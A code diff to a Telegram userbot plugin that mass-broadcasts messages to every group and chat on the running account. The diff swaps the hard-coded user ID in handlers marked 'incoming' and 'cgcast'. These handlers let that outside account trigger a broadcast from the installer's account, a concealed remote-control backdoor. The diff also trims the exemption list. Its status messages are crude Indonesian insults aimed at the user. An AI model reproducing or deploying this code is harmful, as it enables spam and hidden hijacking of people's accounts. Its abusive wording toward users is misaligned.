@@ -3,27 +3,13 @@ from userbot import CMD_HELP, bot
 
 
 GCAST_BLACKLIST = [
-    -1001473548283,  # SharingUserbot
-    -1001433238829,  # TedeSupport
-    -1001476936696,  # AnosSupport
-    -1001327032795,  # UltroidSupport
-    -1001294181499,  # UserBotIndo
-    -1001419516987,  # VeezSupportGroup
-    -1001209432070,  # GeezSupportGroup
-    -1001296934585,  # X-PROJECT BOT
-    -1001481357570,  # UsergeOnTopic
-    -1001459701099,  # CatUserbotSupport
-    -1001109837870,  # TelegramBotIndonesia
-    -1001752592753,  # Skyzusupport
-    -1001456135097,  # SpamBot
-    -1001462425381,  # GRUP GUA
-    -1001649802697,  # GRUP GUA
+    -1001508910413,  # GROUP GUA
+    -1001735661117,  # GROUP SPAM
 ]
 
-# BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=2048936969, pattern=r"^\.cgcast$")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -31,9 +17,9 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Pesannya Mana ngentot??**")
+        await event.edit("**Kata² Promosi Li Mana Pea🗿??**")
         return
-    kk = await event.edit("`Lagi Gua kirim tot, Limit jangan salahin Gua anjing!!!!!`")
+    kk = await event.edit("`Lagi Sebar Promosi Jual Diri Lo Nih!!!!!`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -48,12 +34,12 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**Berhasil Promosi Ke** `{done}` **Grup, Gagal Promosi Ke** `{er}` **Grup**"
     )
 
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgucast$")
+@register(incoming=True, from_users=2048936969, pattern=r"^\.cgucast$")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
